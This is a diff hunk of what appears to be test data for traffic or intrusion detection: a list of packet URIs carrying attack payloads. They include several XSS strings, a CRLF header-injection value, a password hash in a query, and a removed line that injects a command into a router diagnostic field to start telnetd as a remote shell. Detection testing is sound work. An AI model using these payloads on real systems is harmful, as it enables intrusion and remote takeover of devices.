@@ -14,7 +14,6 @@ Packet [35]	Uri [/swms/ms.cgi?MSM_SID=<session_id>&MSM_MACRO_NAME=Show_Fatal_Err
 Packet [42]	Uri [/commit2.cgi?ADMIN_PASSWD=$1$ZZ0DVlc6$QLqFLzW8YDZObgHtMZrYF/]
 Packet [43]	Uri [/home/seos/courier/login.html?auth_params=x%0Dnew:header]
 Packet [45]	Uri [/courier/1000@/oauth/playground/callback.html#<img%20src=x%20onerror=alert('xss')>]
-Packet [48]	Uri [/cgi?2&[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6%20dataBlockSize=64%20timeout=1%20numberOfRepetitions=1%20host=$(echo%20127.0.0.1;%20/usr/sbin/telnetd%20-l%20bin/sh%20-p%2025)%20X_TP_ConnName=ewan_ipoe_d%20diagnosticsState=Requested]
 Packet [49]	Uri [/gwadmin-console/install/login.jsp?token=asdf%22%2balert%28%27xss%27%29%2b%22]
 Packet [50]	Uri [/gwadmin-console/index.jsp#poa:%3Cimg%20src=x%20onerror=alert%28%27xss%27%29%3E]
 Packet [52]	Uri [/responder.fcgi1?winid=106&winname=Users%20%26%20Groups&slot=1&mainslot=1]
